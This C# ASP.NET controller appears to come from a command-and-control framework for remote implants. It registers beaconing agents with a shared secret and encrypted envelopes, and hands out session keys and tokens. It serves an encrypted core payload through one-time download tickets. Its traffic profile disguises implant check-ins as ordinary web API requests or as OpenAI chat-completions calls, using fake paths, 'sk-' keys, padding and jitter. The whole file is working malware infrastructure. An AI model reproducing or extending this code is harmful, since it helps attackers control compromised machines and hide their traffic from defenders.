using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Profiles;

namespace LibraNextgen.Service.Controllers;

/// <summary>
/// </summary>
[ApiController]
[Route("api/v1")]
public class V1BootstrapController : ControllerBase
{
    private static readonly string BuildsDir = AgentCommsController.BuildsDir;

    private readonly AgentCommsService _commsService;
    private readonly ServerKeyService _serverKeys;
    private readonly BeaconSettings _beaconSettings;
    private readonly AgentService _agentService;
    private readonly DownloadTicketStore _tickets;
    private readonly IWebHostEnvironment _env;
    private readonly ConnectionManager _wsManager;
    private readonly AiEventNotifier _aiEventNotifier;

    public V1BootstrapController(
        AgentCommsService commsService,
        ServerKeyService serverKeys,
        IOptions<BeaconSettings> beaconSettings,
        AgentService agentService,
        DownloadTicketStore tickets,
        IWebHostEnvironment env,
        ConnectionManager wsManager,
        AiEventNotifier aiEventNotifier)
    {
        _commsService = commsService;
        _serverKeys = serverKeys;
        _beaconSettings = beaconSettings.Value;
        _agentService = agentService;
        _tickets = tickets;
        _env = env;
        _wsManager = wsManager;
        _aiEventNotifier = aiEventNotifier;
    }

    /// <summary>
    /// </summary>
    [HttpPost("session")]
    public async Task<IActionResult> Session([FromBody] JsonElement? body)
    {
        RegisterRequest? request = null;
        var plaintext = false;

        if (body is { } el
            && el.TryGetProperty("client_id", out var cidProp) && cidProp.GetString() is string cipherBody
            && el.TryGetProperty("client_secret", out var csProp) && csProp.GetString() is string encKey)
        {
            try
            {
                var plain = _serverKeys.OpenEnvelope(encKey, cipherBody);
                request = JsonSerializer.Deserialize<RegisterRequest>(plain, new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true
                });
            }
            catch (Exception)
            {
                return Unauthorized(new { error = "envelope decrypt failed" });
            }
        }
        else if (body is { } plainEl)
        {
            try
            {
                request = plainEl.Deserialize<RegisterRequest>(new JsonSerializerOptions
                {
                    PropertyNameCaseInsensitive = true
                });
                plaintext = true;
            }
            catch (JsonException)
            {
                return BadRequest(new { error = "invalid registration body" });
            }
        }

        if (request == null || string.IsNullOrWhiteSpace(request.Hostname))
            return BadRequest(new { error = "hostname required" });
        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });

        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var profile = await _commsService.GetActiveProfileAsync();
        var agent = await _commsService.HandleRegisterAsync(request, clientIp, profile.HeartbeatIntervalSeconds);
        if (agent == null)
            return StatusCode(500, new { error = "registration failed" });

        _ = BroadcastOnlineAsync(agent, clientIp);

        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);
        var sessionToken = _commsService.IssueSessionToken(agent.Id);

        var heartbeatIntervalMs = HeartbeatTiming.GetIntervalMs(agent);
        var response = new
        {
            agent_id = agent.Id,
            session_key = sessionKey,
            session_token = sessionToken,
            ws_url = profile.GetWebSocketUrl(""),
            heartbeat_interval = HeartbeatTiming.GetIntervalSeconds(agent),
            heartbeat_interval_ms = heartbeatIntervalMs,
            jitter_percent = profile.JitterPercent,
            profile = BuildTransformJson(profile, heartbeatIntervalMs)
        };
        return Ok(response);
    }

    private async Task BroadcastOnlineAsync(Agent agent, string clientIp)
    {
        try
        {
            var msg = new WebSocketMessage
            {
                Type = "agent.status",
                Channel = agent.Id,
                Data = JsonSerializer.SerializeToElement(new { agentId = agent.Id, status = AgentStatus.Online.ToString() })
            };
            await _wsManager.BroadcastToConsoleAsync(msg);
            _wsManager.AppendEvent("agent", $"Agent {agent.Hostname} ({clientIp}) 上线");
        }
        catch
        {
        }
        _ = _aiEventNotifier.NotifyAsync(agent.Id, agent.Hostname, clientIp, AiEventNotifier.EvtAgentOnline);
    }

    [HttpPost("auth/token")]
    public IActionResult AuthToken([FromBody] JsonElement? body)
    {
        if (body is not { } el
            || el.TryGetProperty("client_id", out var cidProp) is false || cidProp.GetString() is not string cipherBody
            || el.TryGetProperty("client_secret", out var csProp) is false || csProp.GetString() is not string encKey)
        {
            return BadRequest(new { error = "invalid body" });
        }

        CoreKeyRequest request;
        try
        {
            var plain = _serverKeys.OpenEnvelope(encKey, cipherBody);
            request = JsonSerializer.Deserialize<CoreKeyRequest>(plain, new JsonSerializerOptions
            {
                PropertyNameCaseInsensitive = true
            })!;
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "envelope decrypt failed" });
        }

        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });
        if (string.IsNullOrWhiteSpace(request.BuildId) || request.BuildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
            return BadRequest(new { error = "invalid build id" });
        if (string.IsNullOrWhiteSpace(request.PublicKey))
            return BadRequest(new { error = "missing public key" });

        var keyPath = Path.Combine(BuildsDir, request.BuildId, "core.key");
        if (!System.IO.File.Exists(keyPath))
            return NotFound(new { error = "core key not found" });

        try
        {
            var aesKey = System.IO.File.ReadAllBytes(keyPath);
            var encrypted = CryptoHelper.RsaEncrypt(aesKey, request.PublicKey);
            var ticket = _tickets.Issue(request.BuildId);
            return Ok(new
            {
                encryptedKey = Convert.ToBase64String(encrypted),
                downloadToken = ticket,
            });
        }
        catch
        {
            return BadRequest(new { error = "invalid public key" });
        }
    }

    [HttpGet("models/{buildId}")]
    public IActionResult Models(string buildId, [FromQuery] string? t)
    {
        if (string.IsNullOrWhiteSpace(buildId) || buildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
            return BadRequest(new { error = "invalid build id" });

        if (!_tickets.Consume(buildId, t ?? ""))
            return Unauthorized(new { error = "invalid or expired download token" });

        var corePath = Path.Combine(BuildsDir, buildId, "core.bin");
        if (!System.IO.File.Exists(corePath))
            return NotFound(new { error = "model not found" });

        var bytes = System.IO.File.ReadAllBytes(corePath);
        return File(bytes, "application/octet-stream");
    }

    private bool IsSecretRequired() => !string.IsNullOrWhiteSpace(_beaconSettings.Secret);

    private bool IsSecretValid(string? provided) =>
        string.Equals(provided, _beaconSettings.Secret, StringComparison.Ordinal);

    private static object BuildTransformJson(IMalleableProfile profile, long? heartbeatIntervalMs = null)
    {
        if (profile is ConfigurableProfile cp)
        {
            var c = cp.Config;
            return new
            {
                entryPath = c.EntryPath,
                pathSuffixes = c.PathSuffixes,
                dataKey = c.DataKey,
                tsKey = c.TsKey,
                randKey = c.RandKey,
                signKey = c.SignKey,
                tokenKey = c.TokenKey,
                userAgents = c.UserAgents,
                extraHeaders = c.CustomHeaders.Select(h => $"{h.Key}: {h.Value}").ToList(),
                paddingMin = c.PaddingMin,
                paddingMax = c.PaddingMax,
                heartbeatIntervalMs = heartbeatIntervalMs ?? (long)c.HeartbeatIntervalSeconds * 1000,
                jitterPercent = c.JitterPercent,
                aiPath = c.AiPath,
                aiModels = c.AiModels,
                authPrefix = c.AuthPrefix
            };
        }
        return new
        {
            entryPath = "/api",
            pathSuffixes = new[] { "user/info", "orders/list", "profile", "settings", "notifications", "messages/unread" },
            dataKey = "d",
            tsKey = "ts",
            randKey = "r",
            signKey = "sign",
            tokenKey = "sid",
            userAgents = Array.Empty<string>(),
            extraHeaders = new[] { "Accept: application/json, text/plain, */*", "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8" },
            paddingMin = 0,
            paddingMax = 64,
            heartbeatIntervalMs = heartbeatIntervalMs ?? 10000,
            jitterPercent = 0.2,
            aiPath = "/v1/chat/completions",
            aiModels = new[] { "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini" },
            authPrefix = "sk-"
        };
    }
}
